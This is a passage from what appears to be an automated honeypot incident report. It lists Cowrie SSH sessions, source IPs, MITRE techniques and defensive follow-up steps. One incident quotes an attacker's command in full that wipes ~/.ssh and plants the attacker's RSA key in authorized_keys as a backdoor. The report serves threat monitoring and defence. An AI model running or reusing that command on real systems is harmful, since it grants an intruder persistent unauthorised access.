| `2026-09-06 09:31:47` | `cowrie.command.failed` |
| `2026-09-06 09:31:48` | `cowrie.log.closed` |
| `2026-09-06 09:31:49` | `cowrie.session.params` |
| `2026-09-06 09:31:49` | `cowrie.command.input` |
| `2026-09-06 09:31:49` | `cowrie.session.file_download` |
| `2026-09-06 09:31:49` | `cowrie.log.closed` |
| `2026-09-06 09:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.52.212[.]235` to AbuseIPDB if not already reported
- [ ] Block `187.52.212[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16c718d8792f

| Field | Detail |
|---|---|
| **Source IP** | `187.52.212[.]235` |
| **First Seen** | 2026-09-06 09:31 |
| **Last Seen** | 2026-09-06 09:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:31:49` | `cowrie.session.connect` |
| `2026-09-06 09:31:49` | `cowrie.client.version` |
| `2026-09-06 09:31:49` | `cowrie.client.kex` |
| `2026-09-06 09:31:50` | `cowrie.login.success` |
| `2026-09-06 09:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.52.212[.]235` to AbuseIPDB if not already reported
- [ ] Block `187.52.212[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-062f79c8d57f

| Field | Detail |
|---|---|
| **Source IP** | `187.52.212[.]235` |
| **First Seen** | 2026-09-06 09:31 |
| **Last Seen** | 2026-09-06 09:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:31:50` | `cowrie.session.connect` |
| `2026-09-06 09:31:50` | `cowrie.client.version` |
| `2026-09-06 09:31:50` | `cowrie.client.kex` |
| `2026-09-06 09:31:51` | `cowrie.login.success` |
| `2026-09-06 09:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.52.212[.]235` to AbuseIPDB if not already reported
- [ ] Block `187.52.212[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34a9a4f2dbc1

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-06 09:42 |
| **Last Seen** | 2026-09-06 09:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:42:35` | `cowrie.session.connect` |
| `2026-09-06 09:42:35` | `cowrie.client.version` |
| `2026-09-06 09:42:35` | `cowrie.client.kex` |
| `2026-09-06 09:42:36` | `cowrie.login.success` |
| `2026-09-06 09:42:40` | `cowrie.direct-tcpip.request` |
| `2026-09-06 09:42:41` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 09:42:41` | `cowrie.direct-tcpip.data` |
| `2026-09-06 09:42:42` | `cowrie.direct-tcpip.request` |
| `2026-09-06 09:42:43` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 09:42:43` | `cowrie.direct-tcpip.data` |
| `2026-09-06 09:42:43` | `cowrie.direct-tcpip.request` |
| `2026-09-06 09:42:43` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 09:42:43` | `cowrie.direct-tcpip.data` |
| `2026-09-06 09:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-386e4022bd21

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-06 09:48 |
| **Last Seen** | 2026-09-06 09:48 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:48:22` | `cowrie.session.connect` |
| `2026-09-06 09:48:22` | `cowrie.client.version` |
| `2026-09-06 09:48:22` | `cowrie.client.kex` |
| `2026-09-06 09:48:23` | `cowrie.login.success` |
| `2026-09-06 09:48:25` | `cowrie.direct-tcpip.request` |
| `2026-09-06 09:48:26` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 09:48:26` | `cowrie.direct-tcpip.data` |
| `2026-09-06 09:48:27` | `cowrie.direct-tcpip.request` |
| `2026-09-06 09:48:27` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 09:48:27` | `cowrie.direct-tcpip.data` |
| `2026-09-06 09:48:38` | `cowrie.direct-tcpip.request` |
| `2026-09-06 09:48:38` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 09:48:38` | `cowrie.direct-tcpip.data` |
| `2026-09-06 09:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad23ed7acd85

| Field | Detail |
|---|---|
| **Source IP** | `171.231.182[.]60` |
| **First Seen** | 2026-09-06 09:51 |
| **Last Seen** | 2026-09-06 09:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:51:32` | `cowrie.session.connect` |
| `2026-09-06 09:51:32` | `cowrie.client.version` |
| `2026-09-06 09:51:33` | `cowrie.client.kex` |
| `2026-09-06 09:51:34` | `cowrie.login.success` |
| `2026-09-06 09:51:35` | `cowrie.direct-tcpip.request` |
| `2026-09-06 09:51:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 09:51:36` | `cowrie.direct-tcpip.data` |
| `2026-09-06 09:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.182[.]60` to AbuseIPDB if not already reported
- [ ] Block `171.231.182[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90603bbe848e

| Field | Detail |
|---|---|
| **Source IP** | `171.231.182[.]60` |
| **First Seen** | 2026-09-06 09:54 |
| **Last Seen** | 2026-09-06 09:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:54:07` | `cowrie.session.connect` |
| `2026-09-06 09:54:07` | `cowrie.client.version` |
| `2026-09-06 09:54:07` | `cowrie.client.kex` |
| `2026-09-06 09:54:13` | `cowrie.login.success` |
| `2026-09-06 09:54:15` | `cowrie.direct-tcpip.request` |
| `2026-09-06 09:54:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 09:54:15` | `cowrie.direct-tcpip.data` |
| `2026-09-06 09:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.182[.]60` to AbuseIPDB if not already reported
- [ ] Block `171.231.182[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1e852e3dfed

| Field | Detail |
|---|---|
| **Source IP** | `171.231.182[.]60` |
| **First Seen** | 2026-09-06 09:58 |
| **Last Seen** | 2026-09-06 09:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:58:39` | `cowrie.session.connect` |
| `2026-09-06 09:58:39` | `cowrie.client.version` |
| `2026-09-06 09:58:39` | `cowrie.client.kex` |
| `2026-09-06 09:58:42` | `cowrie.login.success` |
| `2026-09-06 09:58:42` | `cowrie.direct-tcpip.request` |
| `2026-09-06 09:58:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 09:58:42` | `cowrie.direct-tcpip.data` |
| `2026-09-06 09:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.182[.]60` to AbuseIPDB if not already reported
- [ ] Block `171.231.182[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2708522d58d0

| Field | Detail |
|---|---|
| **Source IP** | `171.231.182[.]60` |
| **First Seen** | 2026-09-06 10:02 |
| **Last Seen** | 2026-09-06 10:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:02:00` | `cowrie.session.connect` |
| `2026-09-06 10:02:00` | `cowrie.client.version` |
| `2026-09-06 10:02:00` | `cowrie.client.kex` |
| `2026-09-06 10:02:07` | `cowrie.login.success` |
| `2026-09-06 10:02:07` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:02:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 10:02:08` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.182[.]60` to AbuseIPDB if not already reported
- [ ] Block `171.231.182[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e95e39acfffd

| Field | Detail |
|---|---|
| **Source IP** | `171.231.182[.]60` |
| **First Seen** | 2026-09-06 10:06 |
| **Last Seen** | 2026-09-06 10:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:06:38` | `cowrie.session.connect` |
| `2026-09-06 10:06:38` | `cowrie.client.version` |
| `2026-09-06 10:06:39` | `cowrie.client.kex` |
| `2026-09-06 10:06:40` | `cowrie.login.success` |
| `2026-09-06 10:06:40` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:06:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 10:06:40` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.182[.]60` to AbuseIPDB if not already reported
- [ ] Block `171.231.182[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17636b53b515

| Field | Detail |
|---|---|
| **Source IP** | `196.192.181[.]202` |
| **First Seen** | 2026-09-06 10:07 |
| **Last Seen** | 2026-09-06 10:07 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:07:07` | `cowrie.session.connect` |
| `2026-09-06 10:07:07` | `cowrie.client.version` |
| `2026-09-06 10:07:07` | `cowrie.client.kex` |
| `2026-09-06 10:07:14` | `cowrie.login.success` |
| `2026-09-06 10:07:15` | `cowrie.session.params` |
| `2026-09-06 10:07:15` | `cowrie.command.input` |
| `2026-09-06 10:07:15` | `cowrie.command.failed` |
| `2026-09-06 10:07:16` | `cowrie.log.closed` |
| `2026-09-06 10:07:17` | `cowrie.session.params` |
| `2026-09-06 10:07:17` | `cowrie.command.input` |
| `2026-09-06 10:07:17` | `cowrie.session.file_download` |
| `2026-09-06 10:07:17` | `cowrie.log.closed` |
| `2026-09-06 10:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.192.181[.]202` to AbuseIPDB if not already reported
- [ ] Block `196.192.181[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18093737f85c

| Field | Detail |
|---|---|
| **Source IP** | `196.192.181[.]202` |
| **First Seen** | 2026-09-06 10:07 |
| **Last Seen** | 2026-09-06 10:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:07:17` | `cowrie.session.connect` |
| `2026-09-06 10:07:17` | `cowrie.client.version` |
| `2026-09-06 10:07:17` | `cowrie.client.kex` |
| `2026-09-06 10:07:18` | `cowrie.login.success` |
| `2026-09-06 10:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.192.181[.]202` to AbuseIPDB if not already reported
- [ ] Block `196.192.181[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c0dacfafe3b

| Field | Detail |
|---|---|
| **Source IP** | `196.192.181[.]202` |
| **First Seen** | 2026-09-06 10:07 |
| **Last Seen** | 2026-09-06 10:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:07:19` | `cowrie.session.connect` |
| `2026-09-06 10:07:19` | `cowrie.client.version` |
| `2026-09-06 10:07:19` | `cowrie.client.kex` |
| `2026-09-06 10:07:20` | `cowrie.login.success` |
| `2026-09-06 10:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.192.181[.]202` to AbuseIPDB if not already reported
- [ ] Block `196.192.181[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87efc625370e

| Field | Detail |
|---|---|
| **Source IP** | `171.231.182[.]60` |
| **First Seen** | 2026-09-06 10:11 |
| **Last Seen** | 2026-09-06 10:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:11:08` | `cowrie.session.connect` |
| `2026-09-06 10:11:08` | `cowrie.client.version` |
| `2026-09-06 10:11:08` | `cowrie.client.kex` |
| `2026-09-06 10:11:10` | `cowrie.login.success` |
| `2026-09-06 10:11:11` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:11:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 10:11:11` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.182[.]60` to AbuseIPDB if not already reported
- [ ] Block `171.231.182[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d528f1c4ee9

| Field | Detail |
|---|---|
| **Source IP** | `171.231.182[.]60` |
| **First Seen** | 2026-09-06 10:15 |
| **Last Seen** | 2026-09-06 10:15 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:15:18` | `cowrie.session.connect` |
| `2026-09-06 10:15:18` | `cowrie.client.version` |
| `2026-09-06 10:15:18` | `cowrie.client.kex` |
| `2026-09-06 10:15:27` | `cowrie.login.success` |
| `2026-09-06 10:15:32` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:15:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 10:15:33` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:15:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.182[.]60` to AbuseIPDB if not already reported
- [ ] Block `171.231.182[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19021ffe1790

| Field | Detail |
|---|---|
| **Source IP** | `171.231.182[.]60` |
| **First Seen** | 2026-09-06 10:17 |
| **Last Seen** | 2026-09-06 10:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:17:50` | `cowrie.session.connect` |
| `2026-09-06 10:17:54` | `cowrie.client.version` |
| `2026-09-06 10:17:54` | `cowrie.client.kex` |
| `2026-09-06 10:17:56` | `cowrie.login.success` |
| `2026-09-06 10:17:56` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:17:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 10:17:57` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.182[.]60` to AbuseIPDB if not already reported
- [ ] Block `171.231.182[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f73d90da549

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-06 10:23 |
| **Last Seen** | 2026-09-06 10:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:23:16` | `cowrie.session.connect` |
| `2026-09-06 10:23:16` | `cowrie.client.version` |
| `2026-09-06 10:23:16` | `cowrie.client.kex` |
| `2026-09-06 10:23:17` | `cowrie.login.success` |
| `2026-09-06 10:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70e9db7dfe85

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-06 10:23 |
| **Last Seen** | 2026-09-06 10:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:23:16` | `cowrie.session.connect` |
| `2026-09-06 10:23:16` | `cowrie.client.version` |
| `2026-09-06 10:23:16` | `cowrie.client.kex` |
| `2026-09-06 10:23:17` | `cowrie.login.success` |
| `2026-09-06 10:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8152af5bb600

| Field | Detail |
|---|---|
| **Source IP** | `171.231.182[.]60` |
| **First Seen** | 2026-09-06 10:23 |
| **Last Seen** | 2026-09-06 10:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:23:35` | `cowrie.session.connect` |
| `2026-09-06 10:23:35` | `cowrie.client.version` |
| `2026-09-06 10:23:36` | `cowrie.client.kex` |
| `2026-09-06 10:23:38` | `cowrie.login.success` |
| `2026-09-06 10:23:38` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:23:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 10:23:38` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.182[.]60` to AbuseIPDB if not already reported
- [ ] Block `171.231.182[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f26c6052692

| Field | Detail |
|---|---|
| **Source IP** | `171.231.182[.]60` |
| **First Seen** | 2026-09-06 10:28 |
| **Last Seen** | 2026-09-06 10:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:28:58` | `cowrie.session.connect` |
| `2026-09-06 10:28:58` | `cowrie.client.version` |
| `2026-09-06 10:28:59` | `cowrie.client.kex` |
| `2026-09-06 10:29:01` | `cowrie.login.success` |
| `2026-09-06 10:29:01` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:29:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 10:29:01` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.182[.]60` to AbuseIPDB if not already reported
- [ ] Block `171.231.182[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4c543d86006

| Field | Detail |
|---|---|
| **Source IP** | `171.231.192[.]158` |
| **First Seen** | 2026-09-06 10:33 |
| **Last Seen** | 2026-09-06 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:33:31` | `cowrie.session.connect` |
| `2026-09-06 10:33:31` | `cowrie.client.version` |
| `2026-09-06 10:33:32` | `cowrie.client.kex` |
| `2026-09-06 10:33:33` | `cowrie.login.success` |
| `2026-09-06 10:33:33` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:33:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 10:33:33` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.192[.]158` to AbuseIPDB if not already reported
- [ ] Block `171.231.192[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9ec8a2e4b9b

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-06 10:36 |
| **Last Seen** | 2026-09-06 10:37 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:36:58` | `cowrie.session.connect` |
| `2026-09-06 10:36:58` | `cowrie.client.version` |
| `2026-09-06 10:36:58` | `cowrie.client.kex` |
| `2026-09-06 10:36:59` | `cowrie.login.success` |
| `2026-09-06 10:37:04` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:37:06` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 10:37:06` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:37:10` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:37:12` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 10:37:12` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:37:15` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:37:16` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 10:37:16` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65bf77dc578f

| Field | Detail |
|---|---|
| **Source IP** | `171.231.192[.]158` |
| **First Seen** | 2026-09-06 10:37 |
| **Last Seen** | 2026-09-06 10:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:37:59` | `cowrie.session.connect` |
| `2026-09-06 10:37:59` | `cowrie.client.version` |
| `2026-09-06 10:38:00` | `cowrie.client.kex` |
| `2026-09-06 10:38:05` | `cowrie.login.success` |
| `2026-09-06 10:38:05` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:38:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-06 10:38:05` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.192[.]158` to AbuseIPDB if not already reported
- [ ] Block `171.231.192[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8490c84b24f

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-06 10:41 |
| **Last Seen** | 2026-09-06 10:42 |
